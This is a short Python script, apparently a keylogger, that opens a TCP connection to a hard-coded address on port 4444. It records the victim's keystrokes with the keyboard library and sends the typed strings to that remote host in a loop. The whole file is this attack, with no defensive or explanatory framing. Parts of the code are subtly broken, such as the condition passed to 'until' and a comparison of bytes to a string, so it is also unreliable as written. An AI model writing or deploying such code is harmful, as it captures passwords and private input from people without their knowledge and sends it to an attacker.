import keyboard
import socket


def set_sock(ip , port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip  ,port))
    return s


def trapped(s):
    while True:
        output = s.recv(65535)
        rec = keyboard.record(until=(output =="exit"))
        seq = keyboard.get_typed_strings(rec)
        print("".join(seq))
        s.send("".join(seq).encode())






if __name__ == "__main__":
    ip = "192.168.123.106"
    port = 4444
    s = set_sock(ip , port)
    trapped(s)